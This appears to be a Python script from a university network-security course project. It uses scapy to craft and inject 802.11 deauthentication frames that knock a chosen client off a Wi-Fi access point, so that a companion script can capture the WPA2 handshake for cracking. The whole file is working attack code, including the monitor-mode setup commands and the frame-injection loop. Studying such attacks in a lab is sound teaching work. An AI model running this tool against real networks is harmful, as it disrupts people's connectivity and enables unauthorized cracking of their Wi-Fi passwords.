#!/usr/bin/env python3
"""
deauth.py  --  CSE 406 Project (Topic 20)

Sends 802.11 deauthentication frames to force a connected client off an
access point. When the client reconnects it performs the WPA2 4-way
handshake again -- which capture.py records so crack.py can attack it.

We CRAFT THE FRAME OURSELVES with scapy (RadioTap / Dot11 / Dot11Deauth).
We do NOT call aireplay-ng. This is the "craft your own frame" deliverable.

Prep (once, in another pane), to put the NIC in monitor mode on the AP channel:
    sudo ip link set wlan0 down
    sudo iw wlan0 set monitor control
    sudo ip link set wlan0 up
    sudo iw wlan0 set channel 6

Run:
    sudo python3 deauth.py

INTERFACE/AP_MAC come from config.py. CLIENT (the device to knock off the AP)
must be set as CLIENT_MAC in config.py before running this.
"""

from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
import sys
import time

import config

# ---- target configuration (edit CLIENT_MAC in config.py) --------------
INTERFACE = config.MONITOR_INTERFACE
AP_MAC    = config.BSSID            # BSSID of target AP
CLIENT    = config.CLIENT_MAC       # a client currently associated to it
COUNT     = 10                      # how many deauth bursts to send
REASON    = 7                       # 802.11 reason code 7 = class-3 frame from
                                    #   nonassociated STA (a common deauth reason)
# -----------------------------------------------------------------------

if not CLIENT:
    sys.exit(
        "[-] config.CLIENT_MAC is empty. Set it to the MAC address of a client\n"
        "    currently associated to the target AP (see config.py) before running this."
    )


def build_deauth(dst, src, bssid):
    """Return ONE 802.11 deauth frame addressed dst<-src inside BSS 'bssid'."""
    # RadioTap()          : the radio header the driver needs to inject a frame
    # Dot11(...)          : the 802.11 MAC header
    #     type=0 subtype=12 -> management frame, subtype 12 = deauthentication
    #     addr1 = receiver (DA), addr2 = transmitter (SA), addr3 = BSSID
    # Dot11Deauth(reason) : the deauth body carrying the reason code
    # The '/' operator in scapy stacks one layer on top of the next.
    return (RadioTap() /
            Dot11(type=0, subtype=12, addr1=dst, addr2=src, addr3=bssid) /
            Dot11Deauth(reason=REASON))


def main():
    # Frame A: tell the CLIENT it is deauthenticated from the AP
    to_client = build_deauth(dst=CLIENT, src=AP_MAC, bssid=AP_MAC)
    # Frame B: tell the AP that the CLIENT has left (helps trigger re-handshake)
    to_ap = build_deauth(dst=AP_MAC, src=CLIENT, bssid=AP_MAC)

    print(f"[*] Deauthing {CLIENT} from {AP_MAC} on {INTERFACE} "
          f"({COUNT} bursts)")

    for i in range(COUNT):                 # range(COUNT) = 0,1,...,COUNT-1
        # sendp() transmits at layer 2 (raw frames) out the given interface.
        sendp(to_client, iface=INTERFACE, count=1, verbose=False)
        sendp(to_ap,     iface=INTERFACE, count=1, verbose=False)
        print(f"    burst {i + 1}/{COUNT} sent")
        time.sleep(0.1)                    # 100 ms between bursts

    print("[+] Done. Watch capture.py for the handshake.")


if __name__ == "__main__":                 # run main() only when executed
    main()                                 # directly (not when imported)
